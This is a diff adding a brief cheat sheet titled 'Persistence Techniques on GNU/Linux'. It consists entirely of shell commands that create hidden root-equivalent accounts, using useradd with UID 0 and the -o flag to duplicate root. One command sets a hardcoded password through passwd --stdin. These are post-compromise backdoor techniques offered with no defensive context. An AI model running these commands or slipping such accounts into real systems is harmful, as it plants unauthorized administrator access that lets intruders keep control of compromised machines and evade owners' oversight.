@@ -1,0 +1,11 @@
+# Persistence Techniques on GNU/Linux
+
+
+# Create an additional administrative account
+/usr/sbin/useradd -d /root -g root -u 0 -s /bin/bash -o admin
+passwd admin
+
+# Create an additional administrative account 2
+sudo useradd -ou 0 -g 0 john
+sudo passwd john
+echo "linuxpassword" | passwd --stdin john
